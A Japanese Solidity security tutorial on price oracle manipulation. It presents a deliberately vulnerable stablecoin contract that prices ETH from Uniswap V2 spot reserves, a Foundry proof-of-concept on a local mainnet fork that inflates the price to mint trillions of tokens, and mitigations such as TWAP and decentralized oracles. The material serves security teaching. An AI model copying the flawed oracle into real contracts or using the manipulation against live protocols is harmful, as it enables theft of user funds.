---
title: S15. オラクル操作
tags:
- solidity
- security
- oracle

---

# WTF Solidity 合約セキュリティ: S15. オラクル操作

最近、Solidityを再学習し、詳細を固めるために「WTF Solidity 合約セキュリティ」を書いています。初心者向けのチュートリアル（プログラミング上級者は他のチュートリアルを参照してください）で、毎週1-3レッスンを更新します。

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

コミュニティ: [Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[公式サイト wtf.academy](https://wtf.academy)

すべてのコードとチュートリアルはgithubで公開: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

---

このレッスンでは、スマートコントラクトのオラクル操作攻撃について紹介し、攻撃例を再現します：`1 ETH`で17兆枚のステーブルコインと交換。2022年だけで、オラクル操作攻撃によるユーザー資産損失は2億ドルを超えています。

## 価格オラクル

セキュリティ上の考慮から、イーサリアム仮想マシン（EVM）は閉鎖された隔離されたサンドボックスです。EVM上で実行されるスマートコントラクトはオンチェーン情報にアクセスできますが、外部と積極的にコミュニケーションしてオフチェーン情報を取得することはできません。しかし、このような情報は分散型アプリケーションにとって非常に重要です。

オラクル（oracle）はこの問題を解決するのに役立ちます。オフチェーンデータソースから情報を取得し、それをオンチェーンに追加してスマートコントラクトが使用できるようにします。

最も一般的に使用されるのは価格オラクル（price oracle）で、これはトークン価格を照会できるデータソースを指します。典型的な使用例：
- 分散型貸付プラットフォーム（AAVE）が借り手が清算しきい値に達したかどうかを判断するために使用します。
- 合成資産プラットフォーム（Synthetix）が資産の最新価格を決定し、0スリッページ取引をサポートするために使用します。
- MakerDAOが担保の価格を決定し、対応するステーブルコイン$DAIを鋳造するために使用します。

![](./img/S15-1.png)

## オラクルの脆弱性

オラクルが開発者によって正しく使用されない場合、大きなセキュリティリスクを引き起こします。

- 2021年10月、BNBチェーン上のDeFiプラットフォームCream Financeがオラクルの脆弱性により[ユーザー資金1億3000万ドルを盗まれました](https://rekt.news/cream-rekt-2/)。
- 2022年5月、Terraチェーン上の合成資産プラットフォームMirror Protocolがオラクルの脆弱性により[ユーザー資金1億1500万ドルを盗まれました](https://rekt.news/mirror-rekt/)。
- 2022年10月、Solanaチェーン上の分散型貸付プラットフォームMango Marketがオラクルの脆弱性により[ユーザー資金1億1500万ドルを盗まれました](https://rekt.news/mango-markets-rekt/)。

## 脆弱性の例

以下でオラクル脆弱性の例、`oUSD`コントラクトを学習します。このコントラクトはERC20標準に準拠したステーブルコインコントラクトです。合成資産プラットフォームSynthetixと同様に、ユーザーはこのコントラクト内でゼロスリッページで`ETH`を`oUSD`（Oracle USD）に交換できます。交換価格はカスタム価格オラクル（`getPrice()`関数）によって決定され、ここではUniswap V2の`WETH-BUSD`の瞬時価格を採用しています。後の攻撃例では、このオラクルがフラッシュローンと大額資金の状況下で非常に操作しやすいことがわかります。

### 脆弱性コントラクト

`oUSD`コントラクトは`BUSD`、`WETH`、`UniswapV2`ファクトリーコントラクト、および`WETH-BUSD`ペアコントラクトのアドレスを記録する7つの状態変数を含みます。

`oUSD`コントラクトは主に3つの関数を含みます：
- コンストラクタ：`ERC20`トークンの名前とシンボルを初期化します。
- `getPrice()`：価格オラクル、Uniswap V2の`WETH-BUSD`の瞬時価格を取得します。これが脆弱性のある箇所です。
  ```
    // ETH価格を取得
    function getPrice() public view returns (uint256 price) {
        // ペア取引対の準備金
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH瞬時価格
        price = reserve0/reserve1;
    }
  ```
- `swap()`：交換関数、オラクルによって与えられた価格で`ETH`を`oUSD`に交換します。

コントラクトコード：

```solidity
contract oUSD is ERC20{
    // メインネットコントラクト
    address public constant FACTORY_V2 =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;

    IUniswapV2Factory public factory = IUniswapV2Factory(FACTORY_V2);
    IUniswapV2Pair public pair = IUniswapV2Pair(factory.getPair(WETH, BUSD));
    IERC20 public weth = IERC20(WETH);
    IERC20 public busd = IERC20(BUSD);

    constructor() ERC20("Oracle USD","oUSD"){}

    // ETH価格を取得
    function getPrice() public view returns (uint256 price) {
        // ペア取引対の準備金
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        // ETH瞬時価格
        price = reserve0/reserve1;
    }

    function swap() external payable returns (uint256 amount){
        // 価格を取得
        uint price = getPrice();
        // 交換量を計算
        amount = price * msg.value;
        // トークンを鋳造
        _mint(msg.sender, amount);
    }
}
```

### 攻撃の考え方

脆弱性のある価格オラクル`getPrice()`関数に対して攻撃を行います。手順：

1. `BUSD`を準備します。自己資金でも、フラッシュローンの借款でも構いません。実装では、Foundryの`deal` cheatcodeを利用してローカルネットワーク上で自分に`1_000_000 BUSD`を鋳造しました。
2. UniswapV2の`WETH-BUSD`プールで`BUSD`を使って大量の`WETH`を購入します。具体的な実装は攻撃コードの`swapBUSDtoWETH()`関数を参照してください。
3. この状況下で、`WETH-BUSD`プール内のトークンペア比率がバランスを失い、`WETH`の瞬時価格が急騰します。この時`swap()`関数を呼び出して`ETH`を`oUSD`に変換します。
4. **オプション：** UniswapV2の`WETH-BUSD`プールで第2ステップで購入した`WETH`を売却し、元本を回収します。

これら4つのステップは1つのトランザクションで完了できます。

### Foundryでの再現

オラクル操作攻撃の再現にはFoundryを選択します。高速で、メインネットのローカルフォークを作成でき、テストに便利だからです。Foundryについて理解していない場合は、[WTF Solidityツール編 T07: Foundry](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md)をお読みください。

1. Foundryをインストール後、コマンドラインで以下のコマンドを入力して新プロジェクトを開始し、openzeppelinライブラリをインストールします。
  ```shell
  forge init Oracle
  cd Oracle
  forge install Openzeppelin/openzeppelin-contracts
  ```

2. ルートディレクトリに`.env`環境変数ファイルを作成し、その中にメインネットrpcを追加してローカルテストネットを作成します。

  ```
  MAINNET_RPC_URL= https://rpc.ankr.com/eth
  ```

3. このレッスンのコード、`Oracle.sol`と`Oracle.t.sol`をそれぞれルートディレクトリの`src`と`test`フォルダにコピーし、以下のコマンドで攻撃スクリプトを実行します。

  ```
  forge test -vv --match-test testOracleAttack
  ```

4. ターミナルで攻撃結果を確認できます。攻撃前、オラクル`getPrice()`が与える`ETH`価格は`1216 USD`で正常です。しかし、`1,000,000` BUSDを使ってUniswapV2の`WETH-BUSD`プールで`WETH`を購入した後、オラクルが与える価格は`17,979,841,782,699 USD`に操作されました。この時、`1 ETH`で17兆枚の`oUSD`と簡単に交換でき、攻撃が完了します。
  ```shell
  Running 1 test for test/Oracle.t.sol:OracleTest
  [PASS] testOracleAttack() (gas: 356524)
  Logs:
    1. ETH Price (before attack): 1216
    2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
    3. ETH price (after attack): 17979841782699
    4. Minted 1797984178269 oUSD with 1 ETH (after attack)

  Test result: ok. 1 passed; 0 failed; finished in 262.94ms
  ```

攻撃コード：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Oracle.sol";

contract OracleTest is Test {
    address private constant alice = address(1);
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router router;
    IWETH private weth = IWETH(WETH);
    IBUSD private busd = IBUSD(BUSD);
    string MAINNET_RPC_URL;
    oUSD ousd;

    function setUp() public {
        MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        // 指定ブロックをフォーク
        vm.createSelectFork(MAINNET_RPC_URL,16060405);
        router = IUniswapV2Router(ROUTER);
        ousd = new oUSD();
    }

    //forge test --match-test  testOracleAttack  -vv
    function testOracleAttack() public {
        // オラクルを攻撃
        // 0. オラクル操作前の価格
        uint256 priceBefore = ousd.getPrice();
        console.log("1. ETH Price (before attack): %s", priceBefore);
        // 自分のアカウントに1000000 BUSDを付与
        uint busdAmount = 1_000_000 * 10e18;
        deal(BUSD, alice, busdAmount);
        // 2. busdでwethを買い、瞬時価格を押し上げる
        vm.prank(alice);
        busd.transfer(address(this), busdAmount);
        swapBUSDtoWETH(busdAmount, 1);
        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
        // 3. オラクル操作後の価格
        uint256 priceAfter = ousd.getPrice();
        console.log("3. ETH price (after attack): %s", priceAfter);
        // 4. oUSDを鋳造
        ousd.swap{value: 1 ether}();
        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18);
    }

    // BUSDをWETHに交換
    function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
        public
        returns (uint amountOut)
    {
        busd.approve(address(router), amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = BUSD;
        path[1] = WETH;

        uint[] memory amounts = router.swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            alice,
            block.timestamp
        );

        // amounts[0] = BUSD amount, amounts[1] = WETH amount
        return amounts[1];
    }
}
```

## 予防方法

著名なブロックチェーンセキュリティ専門家`samczsun`が[ブログ](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle)でオラクル操作の予防方法をまとめています。ここで要約します：

1. 流動性の低いプールを価格オラクルとして使用しない。
2. スポット/瞬時価格を価格オラクルとして使用せず、価格遅延を加える。例：時間加重平均価格（TWAP）。
3. 分散型オラクルを使用する。
4. 複数のデータソースを使用し、毎回価格の中央値に最も近いいくつかをオラクルとして選択し、極端な状況を避ける。
5. Oracleオラクルの価格照会メソッド（`latestRoundData()`など）を使用する際は、返される結果を検証し、期限切れの無効なデータの使用を防ぐ。
6. サードパーティ価格オラクルの使用ドキュメントとパラメータ設定を注意深く読む。

## まとめ

このレッスンでは、オラクル操作攻撃について紹介し、脆弱性のある合成ステーブルコインコントラクトを攻撃し、`1 ETH`で17兆ステーブルコインと交換して世界一の富豪になりました（実際にはなっていません）。